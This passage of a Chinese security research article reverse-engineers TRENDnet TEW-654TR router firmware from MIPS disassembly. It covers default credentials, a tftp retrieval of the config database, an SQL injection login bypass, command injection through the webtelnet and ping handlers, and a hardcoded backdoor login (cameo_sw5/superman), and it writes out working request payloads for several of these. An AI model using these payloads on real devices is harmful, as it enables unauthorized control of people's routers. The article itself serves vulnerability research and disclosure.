<pre><code>.text:00409460                 blez    $s1, loc_409938
.text:00409464                 lui     $s0, 2
.text:00409468                 la      $t9, open_db
.text:0040946C                 ori     $a0, $s0, 0xE5F0
.text:00409470                 jalr    $t9 ; open_db
.text:00409474                 addu    $a0, $s3, $a0
.text:00409478                 lw      $gp, 0x2E6F0+var_2E6E0($sp)
.text:0040947C                 nop</code></pre>
<p>我们搜一下存在的db文件:</p>
<pre><code>root@ubuntu:~/_TEW-654TRA1_FW110B12.bin.extracted/squashfs-root# find ./ -name *.db
./mnt/wizard_rt.db
./mnt/user.db
./mnt/ap.db
./mnt/rt.db
./mnt/default_rt.db
./mnt/default_apc.db
./mnt/wizard_ap.db
./mnt/default_ap.db
./mnt/apc.db
./mnt/iface.db</code></pre>
<p>来看一下内容:</p>
<pre><code>root@ubuntu:~/_TEW-654TRA1_FW110B12.bin.extracted/squashfs-root# file ./mnt/user.db 
./mnt/user.db: SQLite 3.x database
root@ubuntu:~/_TEW-654TRA1_FW110B12.bin.extracted/squashfs-root# sqlite3 ./mnt/user.db 
SQLite version 3.11.0 2016-02-15 17:29:24
Enter ".help" for usage hints.
sqlite&gt; .tables
login_info
sqlite&gt; .schema login_info
CREATE TABLE "login_info" ("login_ip" VARCHAR NOT NULL , "login_time" INTEGER NOT NULL , "login_level" CHAR NOT NULL );
sqlite&gt; select * from login_info;
sqlite&gt; select * from login_info;
sqlite&gt; open
   ...&gt; ;
Error: near "open": syntax error
sqlite&gt; ^Z
[1]+  Stopped                 sqlite3 ./mnt/user.db
root@ubuntu:~/_TEW-654TRA1_FW110B12.bin.extracted/squashfs-root# sqlite3 ./mnt/rt.db 
SQLite version 3.11.0 2016-02-15 17:29:24
Enter ".help" for usage hints.
sqlite&gt; .tables
advanced_network      smtp_settings         wan_settings        
daylight_saving       special_application   wan_static          
db_version            static_routing        website_filter      
dhcp_server           syslog                website_filter_mode 
dmz                   time                  wireless_advanced   
dynamic_dns           user                  wireless_basic      
dynamic_routing       virtual_server        wireless_filter     
ip_filter             wan_dhcp              wireless_filter_mode
lan_settings          wan_l2tp              wireless_security   
log_setting           wan_pppoe             wireless_wps        
message               wan_pptp              wizard_setting      
nat_filter            wan_russia_l2tp       wpa_settings        
remote_management     wan_russia_pppoe    
restore_default       wan_russia_pptp     
sqlite&gt; .schema user
CREATE TABLE "user" ("user_name" VARCHAR DEFAULT '', "user_pwd" VARCHAR DEFAULT '', "level" CHAR DEFAULT '');
sqlite&gt; select * from user;
admin|admin|1
user|user|0</code></pre>
<p>那么如何才能获得查询这个表呢?&nbsp;    <br />当然可以注入,不过还有更优雅的方式.&nbsp;    <br />黑盒测试时,扫描AP的所有端口,能发现开了69,探测指纹得知是tftp.&nbsp;    <br />白盒读启动配置文件,能直接看到.</p>
<pre><code>root@ubuntu:~/_TEW-654TRA1_FW110B12.bin.extracted/squashfs-root/etc/rc.d# cat rcS 
#!/bin/ash

# This script runs when init it run during the boot process.
# Mounts everything in the fstab
mount -a
mount -o remount +w /

# Mount the RAM filesystem to /tmp
mount -t tmpfs tmpfs /tmp

# copy all files in the mnt folder to the etc folder
cp -a /mnt/* /etc
mkdir -p /var/etc
mkdir -p /var/firm
mkdir -p /var/log
mkdir -p /var/misc
mkdir -p /var/run
mkdir -p /var/sbin
mkdir -p /var/tmp
mkdir -p /tmp/var
cp -f /etc/udhcpd.conf /var/etc/
cp -f /etc/udhcpd.leases /var/misc/
#Add link for resolv.conf
#ln -sf /var/etc/resolv.conf /etc/resolv.conf
# Load configure file from Flash
/bin/echo "Init System..."
system_manager &amp;
# Start tftpd
/bin/echo "Start Tftpd..."
tftpd &amp;
#insert cc_dev module for reset packet counter
insmod /lib/modules/cc_dev.ko</code></pre>
<p>那么:</p>
<pre><code>root@ubuntu:~# tftp 192.168.114.131
tftp&gt; get /mnt/rt.db
Received 54272 bytes in 0.0 seconds
tftp&gt; ^C
tftp&gt; ll
?Invalid command
tftp&gt; ^Z
[2]+  Stopped                 tftp 192.168.114.131
root@ubuntu:~# 
root@ubuntu:~# ll | grep rt.db
-rw-r--r--  1 root root    54220 Oct 20 00:14 rt.db</code></pre>
<hr />
<h2>0&#215;03 漏洞分析二:sql injection</h2>
<p>接着看那段open_db的代码:</p>
<pre><code>.text:00409460                 blez    $s1, loc_409938
.text:00409464                 lui     $s0, 2
.text:00409468                 la      $t9, open_db
.text:0040946C                 ori     $a0, $s0, 0xE5F0
.text:00409470                 jalr    $t9 ; open_db
.text:00409474                 addu    $a0, $s3, $a0
.text:00409478                 lw      $gp, 0x2E6F0+var_2E6E0($sp)
.text:0040947C                 nop
.text:00409480                 la      $v1, my_db
.text:00409484                 beqz    $v0, loc_40914C 

返回失败句柄的时候,跟上面一样.恢复现场
.text:0040914C loc_40914C:                              # CODE XREF: main+94j
.text:0040914C                                          # main+3F4j ...
.text:0040914C                 lui     $t0, 2
.text:00409150
.text:00409150 loc_409150:                              # CODE XREF: main+240j
.text:00409150                                          # main+324j ...
.text:00409150                 ori     $t0, 0x6710
.text:00409460                 blez    $s1, loc_409938
.text:00409464                 lui     $s0, 2
.text:00409468                 la      $t9, open_db
.text:0040946C                 ori     $a0, $s0, 0xE5F0
.text:00409470                 jalr    $t9 ; open_db
.text:00409474                 addu    $a0, $s3, $a0
.text:00409478                 lw      $gp, 0x2E6F0+var_2E6E0($sp)
.text:0040947C                 nop
.text:00409480                 la      $v1, my_db
.text:00409484                 beqz    $v0, loc_40914C  # open fail, restore s0-s7,fp,ra</code></pre>
<p>返回成功句柄会调用check_remote_ip函数,这函数就是字面意思,没什么特殊的检测动作:</p>
<pre><code>.text:004094BC                 move    $a0, $s5
.text:004094C0                 la      $t9, check_remote_ip
.text:004094C4                 nop
.text:004094C8                 jalr    $t9 ; check_remote_ip
.text:004094CC                 move    $s2, $v0
.text:004094D0                 li      $a0, 0x2E6BC     # it's likely exist vuln.
.text:004094D0                                          # because verify(remote ip) entry login
.text:004094D8                 addu    $a0, $sp
.text:004094DC                 lw      $gp, 0x2E6F0+var_2E6E0($sp)
.text:004094E0                 blez    $s2, loc_409824</code></pre>
<p>返回值&lt;=0的话就关闭open_db的句柄:</p>
<pre><code>.text:00409824 loc_409824:                              # CODE XREF: main+450j
.text:00409824                                          # main+9D4j ...
.text:00409824                 la      $v1, my_db
.text:00409828                 la      $t9, close_db
.text:0040982C                 lw      $a0, (my_db - 0x45A6D4)($v1)
.text:00409830                 jalr    $t9 ; close_db
.text:00409834                 nop
.text:00409838                 lw      $gp, 0x2E6F0+var_2E6E0($sp)
.text:0040983C                 bnez    $s7, loc_409A20
.text:00409840                 nop</code></pre>
<p style="text-align: center;"><img alt="5.png" data-original="http://image.3001.net/images/20170208/14865506641215.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="586" height="1002">    </p>
<noscript><img alt="5.png" src="http://image.3001.net/images/20170208/14865506641215.png!small" width="586" height="1002">    </p></noscript>
<p>之后还有write_db_flash的动作,remote_ip在认证流程中看起来很重要.感觉就像用的ip认证.而非cookie.&nbsp;    <br />这里我没有真实的路由器,验证起来有点麻烦,有这款路由器的读者可以测试一下.</p>
<p>check_remote_ip之后,比较接受到的参数值,这里比较的是登录后的动作,验证不通过则跳到loc_40964C进行登录:</p>
<pre><code>.text:004094E4                 sw      $v0, 0($a0)
.text:004094E8                 la      $s1, loc_410000
.text:004094EC                 la      $t9, strcmp
.text:004094F0                 addiu   $s0, $sp, 0x2E6F0+var_2E6B8
.text:004094F4                 move    $a0, $s0
.text:004094F8                 jalr    $t9 ; strcmp
.text:004094FC                 addiu   $a1, $s1, (aLogin - 0x410000)  # "login"
.text:00409500                 lw      $gp, 0x2E6F0+var_2E6E0($sp)
.text:00409504                 beqz    $v0, loc_40964C
.text:00409508                 nop
.text:0040950C                 la      $a1, loc_410000
.text:00409510                 la      $t9, strcmp
.text:00409514                 addiu   $a1, (aShow_message - 0x410000)  # "show_message"
.text:00409518                 jalr    $t9 ; strcmp
.text:0040951C                 move    $a0, $s0
.text:00409520                 lw      $gp, 0x2E6F0+var_2E6E0($sp)
.text:00409524                 beqz    $v0, loc_40964C
.text:00409528                 nop
.text:0040952C                 la      $a1, loc_410000
.text:00409530                 la      $t9, strcmp
.text:00409534                 addiu   $a1, (aReboot - 0x410000)  # "reboot"
.text:00409538                 jalr    $t9 ; strcmp
.text:0040953C                 move    $a0, $s0
.text:00409540                 lw      $gp, 0x2E6F0+var_2E6E0($sp)
.text:00409544                 beqz    $v0, loc_40964C
.text:00409548                 nop
.text:0040954C                 la      $a1, loc_410000
.text:00409550                 la      $t9, strcmp
.text:00409554                 addiu   $a1, (aLogout - 0x410000)  # "logout"
.text:00409558                 jalr    $t9 ; strcmp
.text:0040955C                 move    $a0, $s0
.text:00409560                 lw      $gp, 0x2E6F0+var_2E6E0($sp)
.text:00409564                 beqz    $v0, loc_40964C
.text:00409568                 nop
.text:0040956C                 la      $a1, loc_410000
.text:00409570                 la      $t9, strcmp
.text:00409574                 addiu   $a1, (aFw_ver - 0x410000)  # "fw_ver"
.text:00409578                 jalr    $t9 ; strcmp
.text:0040957C                 move    $a0, $s0
.text:00409580                 lw      $gp, 0x2E6F0+var_2E6E0($sp)
.text:00409584                 beqz    $v0, loc_40964C
.text:00409588                 nop
.text:0040958C                 la      $a1, loc_410000
.text:00409590                 la      $t9, strcmp
.text:00409594                 addiu   $a1, (aHw_ver - 0x410000)  # "hw_ver"
.text:00409598                 jalr    $t9 ; strcmp
.text:0040959C                 move    $a0, $s0
.text:004095A0                 lw      $gp, 0x2E6F0+var_2E6E0($sp)
.text:004095A4                 beqz    $v0, loc_40964C
.text:004095A8                 nop
.text:004095AC                 la      $a1, loc_410000
.text:004095B0                 la      $t9, strcmp
.text:004095B4                 addiu   $a1, (aCheck_station_ - 0x410000)  # "check_station_status"
.text:004095B8                 jalr    $t9 ; strcmp
.text:004095BC                 move    $a0, $s0
.text:004095C0                 lw      $gp, 0x2E6F0+var_2E6E0($sp)
.text:004095C4                 beqz    $v0, loc_40964C
.text:004095C8                 nop
.text:004095CC                 la      $a1, loc_410000
.text:004095D0                 la      $t9, strcmp
.text:004095D4                 addiu   $a1, (aGet_router_ip - 0x410000)  # "get_router_ip"
.text:004095D8                 jalr    $t9 ; strcmp
.text:004095DC                 move    $a0, $s0
.text:004095E0                 lw      $gp, 0x2E6F0+var_2E6E0($sp)
.text:004095E4                 beqz    $v0, loc_40964C
.text:004095E8                 nop
.text:004095EC                 la      $a1, loc_410000
.text:004095F0                 la      $t9, strcmp
.text:004095F4                 addiu   $a1, (aGet_device_nam - 0x410000)  # "get_device_name"
.text:004095F8                 jalr    $t9 ; strcmp
.text:004095FC                 move    $a0, $s0
.text:00409600                 lw      $gp, 0x2E6F0+var_2E6E0($sp)
.text:00409604                 beqz    $v0, loc_40964C
.text:00409608                 nop
.text:0040960C                 la      $a1, loc_410000
.text:00409610                 la      $t9, strcmp
.text:00409614                 addiu   $a1, (aNoAuth - 0x410000)  # "no-auth"
.text:00409618                 jalr    $t9 ; strcmp
.text:0040961C                 move    $a0, $s0
.text:00409620                 lw      $gp, 0x2E6F0+var_2E6E0($sp)
.text:00409624                 beqz    $v0, loc_40964C
.text:00409628                 move    $a0, $s0
.text:0040962C                 la      $a1, loc_410000
.text:00409630                 la      $t9, strcmp
.text:00409634                 nop
.text:00409638                 jalr    $t9 ; strcmp
.text:0040963C                 addiu   $a1, (aLanguage - 0x410000)  # "language"
.text:00409640                 lw      $gp, 0x2E6F0+var_2E6E0($sp)
.text:00409644                 bnez    $v0, loc_40A0B0
.text:00409648                 nop
.text:0040964C
.text:0040964C loc_40964C:                              # CODE XREF: main+474j
.text:0040964C                                          # main+494j ...
.text:0040964C                 la      $a1, loc_410000
.text:00409650                 la      $t9, strcmp
.text:00409654                 addiu   $a1, (aLoad_setting - 0x410000)  # "load_setting"
.text:00409658                 jalr    $t9 ; strcmp
.text:0040965C                 move    $a0, $s3
.text:00409660                 lw      $gp, 0x2E6F0+var_2E6E0($sp)
.text:00409664                 beqz    $v0, loc_409A3C
.text:00409668                 addiu   $a1, $s1, (aLogin - 0x410000)  # "login"
.text:0040966C                 la      $t9, strcmp
.text:00409670                 addiu   $s0, $s3, 0x20
.text:00409674                 jalr    $t9 ; strcmp
.text:00409678                 move    $a0, $s0
.text:0040967C                 lw      $gp, 0x2E6F0+var_2E6E0($sp)
.text:00409680                 beqz    $v0, loc_409A6C</code></pre>
<p>在loc_40964c处下断点.</p>
<p style="text-align: center;"><img alt="6.png" data-original="http://image.3001.net/images/20170208/14865506829079.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="690" height="632">    </p>
<noscript><img alt="6.png" src="http://image.3001.net/images/20170208/14865506829079.png!small" width="690" height="632">    </p></noscript>
<p style="text-align: center;"><img alt="7.png" data-original="http://image.3001.net/images/20170208/14865506967506.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="657" height="165">    </p>
<noscript><img alt="7.png" src="http://image.3001.net/images/20170208/14865506967506.png!small" width="657" height="165">    </p></noscript>
<p>s0指向&#8221;login&#8221;,作为参数传给strcmp,之后进入loc_409A6C,指向do_login函数,执行sql查询.</p>
<pre><code>.text:00409A6C loc_409A6C:                              # CODE XREF: main+5F0j
.text:00409A6C la      $t9, do_login
.text:00409A70 lw      $a3, 0x2E6F0+var_2E6F0($fp)
.text:00409A74 move    $a1, $s2
.text:00409A78 jalr    $t9 ; do_login
.text:00409A7C move    $a2, $s5
.text:00409A80 lw      $gp, 0x2E6F0+var_2E6E0($sp)
.text:00409A84 b       loc_409824
.text:00409A88 nop</code></pre>
<p style="text-align: center;"><img alt="8.png" data-original="http://image.3001.net/images/20170208/14865507315078.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="690" height="592">    </p>
<noscript><img alt="8.png" src="http://image.3001.net/images/20170208/14865507315078.png!small" width="690" height="592">    </p></noscript>
<p>将用户名和密码复制到栈上,比较长度,重置一片空间,选择数据库,exec_sql,可以看到没有任何过滤动作,存在注入.&nbsp;    <br />此时我们user=admin pass=password,登录失败进行重定向.恢复栈帧.</p>
<pre><code>.text:0040B82C loc_40B82C:                              # CODE XREF: do_login+138j
.text:0040B82C la      $v0, loc_410000
.text:0040B830 nop
.text:0040B834 addiu   $s0, $v0, (aLogin - 0x410000)    # "login"
.text:0040B838
.text:0040B838 loc_40B838:                              # CODE XREF: do_login+35Cj
.text:0040B838                                          # do_login+384j
.text:0040B838 la      $t9, unk_40A06B88
.text:0040B83C nop
.text:0040B840 jalr    $t9 ; free
.text:0040B844 move    $a0, $s2
.text:0040B848 lw      $gp, 0x78+var_68($sp)
.text:0040B84C nop
.text:0040B850 la      $t9, set_redirect_page
.text:0040B854 nop
.text:0040B858 jalr    $t9 ; set_redirect_page
.text:0040B85C move    $a0, $s0
.text:0040B860 lw      $gp, 0x78+var_68($sp)
.text:0040B864 lw      $ra, 0x78+var_8($sp)
.text:0040B868 lw      $s5, 0x78+var_C($sp)
.text:0040B86C lw      $s4, 0x78+var_10($sp)
.text:0040B870 lw      $s3, 0x78+var_14($sp)
.text:0040B874 lw      $s2, 0x78+var_18($sp)
.text:0040B878 lw      $s1, 0x78+var_1C($sp)
.text:0040B87C lw      $s0, 0x78+var_20($sp)
.text:0040B880 jr      $ra
.text:0040B884 addiu   $sp, 0x78</code></pre>
<p>那么构造:&nbsp;    <br /><code>request=login&amp;user_name=admin&amp;user_pwd='%20or%20'1'%3D'1"</code></p>
<p style="text-align: center;"><img alt="9.png" data-original="http://image.3001.net/images/20170208/14865507506013.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="633" height="392">    </p>
<noscript><img alt="9.png" src="http://image.3001.net/images/20170208/14865507506013.png!small" width="633" height="392">    </p></noscript>
<hr />
<h2>0&#215;04 漏洞分析三: 任意命令执行</h2>
<p>继续向下看,<code>beqz $v0, loc_409A6C</code>&nbsp;beqz显然,执行完登录认证的动作后并不会跳回来.&nbsp;    <br />下方还有好几处字符串比较动作,admin_webtelnet尤其引人注意,我们来看一下send_telnet_cmd函数.</p>
<pre><code>.text:0040964C loc_40964C:                              # CODE XREF: main+474j
.text:0040964C                                          # main+494j ...
.text:0040964C                 la      $a1, loc_410000
.text:00409650                 la      $t9, strcmp
.text:00409654                 addiu   $a1, (aLoad_setting - 0x410000)  # "load_setting"
.text:00409658                 jalr    $t9 ; strcmp
.text:0040965C                 move    $a0, $s3
.text:00409660                 lw      $gp, 0x2E6F0+var_2E6E0($sp)
.text:00409664                 beqz    $v0, loc_409A3C
.text:00409668                 addiu   $a1, $s1, (aLogin - 0x410000)  # "login"
.text:0040966C                 la      $t9, strcmp
.text:00409670                 addiu   $s0, $s3, 0x20
.text:00409674                 jalr    $t9 ; strcmp
.text:00409678                 move    $a0, $s0
.text:0040967C                 lw      $gp, 0x2E6F0+var_2E6E0($sp)
.text:00409680                 beqz    $v0, loc_409A6C
.text:00409684                 move    $a0, $s3
.text:00409688                 la      $a1, loc_410000
.text:0040968C                 la      $t9, strcmp
.text:00409690                 addiu   $a1, (aAdmin_login - 0x410000)  # "admin_login"
.text:00409694                 jalr    $t9 ; strcmp 
.text:00409698                 move    $a0, $s0
.text:0040969C                 lw      $gp, 0x2E6F0+var_2E6E0($sp)
.text:004096A0                 nop
.text:004096A4                 la      $t9, admin_login
.text:004096A8                 beqz    $v0, loc_409AB0
.text:004096AC                 move    $a0, $s3
.text:004096B0                 la      $a1, loc_410000
.text:004096B4                 la      $t9, strcmp
.text:004096B8                 addiu   $a1, (aAdmin_webtelne - 0x410000)  # "admin_webtelnet"
.text:004096BC                 jalr    $t9 ; strcmp
.text:004096C0                 move    $a0, $s0
.text:004096C4                 lw      $gp, 0x2E6F0+var_2E6E0($sp)
.text:004096C8                 nop
.text:004096CC                 la      $t9, send_telnet_cmd
.text:004096D0                 beqz    $v0, loc_409ACC
.text:004096D4                 nop
======================================================================

loc_409ACC:

.text:00409ACC                 jalr    $t9
.text:00409AD0                 move    $a0, $s3
.text:00409AD4                 lw      $gp, 0x2E6F0+var_2E6E0($sp)
.text:00409AD8                 b       loc_409824
.text:00409ADC                 nop
======================================================================

.text:00415308                 .globl send_telnet_cmd
.text:00415308 send_telnet_cmd:                         # DATA XREF: main+63Co
.text:00415308                                          # .got:send_telnet_cmd_ptro
.text:00415308
.text:00415308 var_18          = -0x18
.text:00415308 var_10          = -0x10
.text:00415308 var_C           = -0xC
.text:00415308 var_8           = -8
.text:00415308
.text:00415308                 li      $gp, 0x4CF78
.text:00415310                 addu    $gp, $t9
.text:00415314                 addiu   $sp, -0x28
.text:00415318                 sw      $ra, 0x28+var_8($sp)
.text:0041531C                 sw      $s1, 0x28+var_C($sp)
.text:00415320                 sw      $s0, 0x28+var_10($sp)
.text:00415324                 sw      $gp, 0x28+var_18($sp)
.text:00415328                 la      $s0, send_cmd
.text:0041532C                 la      $t9, memset
.text:00415330                 move    $s1, $a0
.text:00415334                 move    $a1, $zero
.text:00415338                 move    $a0, $s0
.text:0041533C                 jalr    $t9 ; memset
.text:00415340                 li      $a2, 0x1F4
.text:00415344                 lw      $gp, 0x28+var_18($sp)
.text:00415348                 move    $a0, $s0
.text:0041534C                 li      $a1, 0x420000
.text:00415350                 la      $t9, sprintf
.text:00415354                 addiu   $a2, $s1, 0x299
.text:00415358                 jalr    $t9 ; sprintf
.text:0041535C                 addiu   $a1, (aSTmpTmp_send_r - 0x420000)  # "%s &gt; /tmp/tmp_send_result"
.text:00415360                 lw      $gp, 0x28+var_18($sp)
.text:00415364                 nop
.text:00415368                 la      $t9, system
.text:0041536C                 nop
.text:00415370                 jalr    $t9 ; system
.text:00415374                 move    $a0, $s0
.text:00415378                 lw      $gp, 0x28+var_18($sp)
.text:0041537C                 lw      $ra, 0x28+var_8($sp)
.text:00415380                 la      $a0, loc_410000
.text:00415384                 la      $t9, set_redirect_page
.text:00415388                 lw      $s1, 0x28+var_C($sp)
.text:0041538C                 lw      $s0, 0x28+var_10($sp)
.text:00415390                 addiu   $a0, (aAdmin_webtelne - 0x410000)  # "admin_webtelnet"
.text:00415394                 jr      $t9 ; set_redirect_page
.text:00415398                 addiu   $sp, 0x28
.text:00415398  # End of function send_telnet_cmd</code></pre>
<p>sprintf拼接字符串交由system执行&nbsp;    <br />但是在当前request=admin_webtelnet的情况下,并不会进入到loc_40964C. 来看一下交叉引用:</p>
<p style="text-align: center;"><img alt="10.png" data-original="http://image.3001.net/images/20170208/14865507642539.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="690" height="272">    </p>
<noscript><img alt="10.png" src="http://image.3001.net/images/20170208/14865507642539.png!small" width="690" height="272">    </p></noscript>
<pre><code>.text:0040A0B0 loc_40A0B0:                              # CODE XREF: main+5B4j
.text:0040A0B0                 la      $t9, update_login_time
.text:0040A0B4                 nop
.text:0040A0B8                 jalr    $t9 ; update_login_time
.text:0040A0BC                 move    $a0, $s5
.text:0040A0C0                 lw      $gp, 0x2E6F0+var_2E6E0($sp)
.text:0040A0C4                 bnez    $v0, loc_40964C
.text:0040A0C8                 nop</code></pre>
<p>更新登录时间,返回true会跳到loc_40964C,明显这是认证成功后的动作,在真实的场景中,我们可以用sql注入或者tftp直接获取admin账号密码&nbsp;    <br />在qemu中动态调试的话,我直接将v0寄存器置为1,进入到loc_40964C.</p>
<p style="text-align: center;"><img alt="11.png" data-original="http://image.3001.net/images/20170208/14865507802826.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="690" height="566">    </p>
<noscript><img alt="11.png" src="http://image.3001.net/images/20170208/14865507802826.png!small" width="690" height="566">    </p></noscript>
<p>那么payload:</p>
<p>&#8220;request=admin_webtelnet&amp;user=whoami&#8221;</p>
<hr />
<h2>0&#215;05 漏洞挖掘一: privilege escalation</h2>
<p>看send_telnet_cmd函数的时候向上翻看到有个admin_login函数,根据/var/check是否存在检查admin是否登录.&nbsp;    <br />admin_login function:</p>
<pre><code>.text:00415220
.text:00415220 li      $gp, 0x4D060
.text:00415228 addu    $gp, $t9
.text:0041522C addiu   $sp, -0x20
.text:00415230 sw      $ra, 0x20+var_4($sp)
.text:00415234 sw      $s0, 0x20+var_8($sp)
.text:00415238 sw      $gp, 0x20+var_10($sp)
.text:0041523C li      $a1, 0x420000
.text:00415240 la      $t9, unk_40A07DA0
.text:00415244 move    $s0, $a0
.text:00415248 addiu   $a1, (aCameo_sw5 - 0x420000)     # "cameo_sw5"
.text:0041524C jalr    $t9 ; strcmp
.text:00415250 addiu   $a0, 0x299
.text:00415254 lw      $gp, 0x20+var_10($sp)
.text:00415258 addiu   $a0, $s0, 0x512
.text:0041525C li      $a1, 0x420000
.text:00415260 la      $t9, unk_40A07DA0
.text:00415264 bnez    $v0, loc_41528C
.text:00415268 addiu   $a1, (aSuperman - 0x420000)      # "superman"
.text:0041526C jalr    $t9 ; strcmp
.text:00415270 nop
.text:00415274 lw      $gp, 0x20+var_10($sp)
.text:00415278 nop
.text:0041527C li      $a0, 0x420000
.text:00415280 la      $t9, _system
.text:00415284 beqz    $v0, loc_4152D4
.text:00415288 addiu   $a0, (aEcho1VarCheck - 0x420000)  # "echo 1 &gt;/var/check"

.text:004152D4  # ---------------------------------------------------------------------------
.text:004152D4
.text:004152D4 loc_4152D4:                              # CODE XREF: admin_login+64j
.text:004152D4 jalr    $t9 ; system
.text:004152D8 nop
.text:004152DC lw      $gp, 0x20+var_10($sp)
.text:004152E0 lw      $ra, 0x20+var_4($sp)
.text:004152E4 la      $v0, loc_410000
.text:004152E8 la      $a0, redirect_page
.text:004152EC addiu   $v0, (aAdmin_webtelne - 0x410000)  # "admin_webtelnet"
.text:004152F0 sw      $v0, (redirect_page - 0x45A6A8)($a0)
.text:004152F4 lw      $a0, (redirect_page - 0x45A6A8)($a0)
.text:004152F8 la      $t9, set_redirect_page
.text:004152FC lw      $s0, 0x20+var_8($sp)
.text:00415300 jr      $t9 ; set_redirect_page
.text:00415304 addiu   $sp, 0x20
.text:00415304  # End of function admin_login</code></pre>
<p>第一个参数无验证,所以普通用户权限登录后:</p>
<p><code>request=admin_login&amp;user_name=cameo_sw5&amp;user_pwd=superman</code></p>
<p style="text-align: center;"><img alt="12.png" data-original="http://image.3001.net/images/20170208/14865507971804.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="690" height="371">    </p>
<noscript><img alt="12.png" src="http://image.3001.net/images/20170208/14865507971804.png!small" width="690" height="371">    </p></noscript>
<p>admin_logout function:</p>
<pre><code>.text:00415748 .globl admin_do_logout
.text:00415748 admin_do_logout:                         # CODE XREF: main+1C7Cp
.text:00415748                                          # DATA XREF: main:loc_40AD04o ...
.text:00415748 li      $gp, 0x4CB38
.text:00415750 addu    $gp, $t9
.text:00415754 li      $a0, 0x420000
.text:00415758 la      $t9, _unlink
.text:0041575C nop
.text:00415760 jr      $t9 ; unlink
.text:00415764 addiu   $a0, (aCatVarCheck+4 - 0x420000)  # "/var/check"
.text:00415764  # End of function admin_do_logout</code></pre>
<hr />
<h2>0&#215;06 漏洞挖掘二: 任意命令执行</h2>
<p>漏洞发生在ping_test函数上,与send_telnet_cmd基本相同.</p>
<pre><code>.text:00415800 .globl ping_test
.text:00415800 ping_test:                               # DATA XREF: main:loc_409AC4o
.text:00415800                                          # .got:ping_test_ptro
.text:00415800
.text:00415800 var_170= -0x170
.text:00415800 var_168= -0x168
.text:00415800 var_118= -0x118
.text:00415800 var_18= -0x18
.text:00415800 var_14= -0x14
.text:00415800 var_10= -0x10
.text:00415800 var_C= -0xC
.text:00415800 var_8= -8
.text:00415800 var_4= -4
.text:00415800
.text:00415800 li      $gp, 0x4CA80
.text:00415808 addu    $gp, $t9
.text:0041580C addiu   $sp, -0x180
.text:00415810 sw      $ra, 0x180+var_4($sp)
.text:00415814 sw      $s4, 0x180+var_8($sp)
.text:00415818 sw      $s3, 0x180+var_C($sp)
.text:0041581C sw      $s2, 0x180+var_10($sp)
.text:00415820 sw      $s1, 0x180+var_14($sp)
.text:00415824 sw      $s0, 0x180+var_18($sp)
.text:00415828 sw      $gp, 0x180+var_170($sp)
.text:0041582C la      $t9, clear_msg
.text:00415830 nop
.text:00415834 jalr    $t9 ; clear_msg
.text:00415838 move    $s1, $a0
.text:0041583C lw      $gp, 0x180+var_170($sp)
.text:00415840 addiu   $s0, $sp, 0x180+var_168
.text:00415844 la      $t9, unk_40A07AB0
.text:00415848 move    $a0, $s0
.text:0041584C move    $a1, $zero
.text:00415850 jalr    $t9 ; memset
.text:00415854 li      $a2, 0x50  # 'P'
.text:00415858 lw      $gp, 0x180+var_170($sp)
.text:0041585C addiu   $s3, $s1, 0x299
.text:00415860 li      $s2, 0x420000
.text:00415864 li      $a1, 0x420000
.text:00415868 la      $t9, unk_409F6050
.text:0041586C addiu   $a1, (aPingC1SS - 0x420000)      # "ping -c 1 %s &gt; %s"
.text:00415870 move    $a2, $s3
.text:00415874 addiu   $a3, $s2, (aTmpPing_result - 0x420000)  # "/tmp/ping_result.log"
.text:00415878 jalr    $t9 ; sprintf
.text:0041587C move    $a0, $s0
.text:00415880 lw      $gp, 0x180+var_170($sp)
.text:00415884 move    $a0, $s0
.text:00415888 la      $t9, _system
.text:0041588C nop
.text:00415890 jalr    $t9 ; system
.text:00415894 move    $s1, $zero</code></pre>
<hr />
<p>reference:&nbsp;    <br />《揭秘家用路由器0day漏洞挖掘技术》 &nbsp;</p>
<p><span style="font-size: 16px;"><a href="http://www.devttys0.com/2011/09/exploiting-embedded-systems-part-1/">http://www.devttys0.com/2011/09/exploiting-embedded-systems-part-1/</a> &nbsp;</span></p>
<p><a href="http://www.devttys0.com/2011/09/exploiting-embedded-systems-part-2/">http://www.devttys0.com/2011/09/exploiting-embedded-systems-part-2/</a> &nbsp;</p>
<p><a href="http://www.devttys0.com/2011/09/exploiting-embedded-systems-part-3/">http://www.devttys0.com/2011/09/exploiting-embedded-systems-part-3/</a>&nbsp;</p>
<p><a href="http://www.devttys0.com/2011/11/exploiting-embedded-systems-part-4/">http://www.devttys0.com/2011/11/exploiting-embedded-systems-part-4/</a></p>
<hr />
<h2>0&#215;07 招聘</h2>
<p>影武者实验室长期招猥琐的渗透测试，有经验的安全研究员，以及激灵的小鲜肉实习生。</p>
<p><b style="color: rgb(239, 71, 71);">* 原创作者：影武者实验室，本文属FreeBuf原创奖励计划，未经许可禁止转载</b><span style="color: rgb(51, 51, 51);"><br /></span></p>
                                                    </div>
                        <div class="article-oper article-oper-new">
                            <style>
                                @font-face {font-family: 'iconfont';
                                    src: url('http://static.3001.net/iconfonts/iconfont.eot'); /* IE9*/
                                    src: url('http://static.3001.net/iconfonts/iconfont.eot?#iefix') format('embedded-opentype'), /* IE6-IE8 */
                                    url('http://static.3001.net/iconfonts/iconfont.woff') format('woff'), /* chrome、firefox */
                                    url('http://static.3001.net/iconfonts/iconfont.ttf') format('truetype'), /* chrome、firefox、opera、Safari, Android, iOS 4.2+*/
                                    url('http://static.3001.net/iconfonts/iconfont.svg#iconfont') format('svg'); /* iOS 4.1- */
                                }
                            </style>
                            <div class="share-new clearfix">
                                <div class="share-author">
                                                                            <a href="http://www.freebuf.com/author/影武者实验室" title="由 影武者实验室 发布" rel="author">
                                            <img src="http://www.freebuf.com/buf/plugins/wp-user-avatar/images/wp-user-avatar-96x96.png" width="50" height="50" alt="" class="avatar avatar-50 wp-user-avatar wp-user-avatar-50 photo avatar-default" />                                            <!--							<img src="http://image.3001.net/2015/06/17.jpg" alt="ArthurKiller">-->
                                        </a>
                                        <div class="share-author-info">
                                                                                        <a class="author-name" href="http://www.freebuf.com/author/影武者实验室">影武者实验室</a>
                                            <!--<span class="icon-f"></span>-->
                                            <span>
